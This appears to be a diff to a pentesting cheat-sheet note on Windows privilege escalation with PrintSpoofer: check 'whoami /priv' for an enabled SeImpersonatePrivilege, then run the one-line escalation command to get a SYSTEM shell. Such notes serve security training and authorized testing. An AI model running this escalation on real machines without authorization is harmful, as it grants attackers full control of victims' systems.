@@ -37,8 +37,7 @@ https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/
 Windows privilege escalation, To achive this check for **Privilages Information** by 
 `whoami /priv'  
 
-PRIVILEGES INFORMATION
-----------------------
+###PRIVILEGES INFORMATION
 
 | Privilege Name             |   Description                            |   State     |  
 |----------------------------|------------------------------------------|-------------|  
@@ -52,5 +51,5 @@ PRIVILEGES INFORMATION
   
 ***SeImpersonatePrivilege*** need to be **Enabled**  
 
-## Command for escaltion
+### Command for escaltion
 `PrinterSpoofer.exe -i -c cmd`
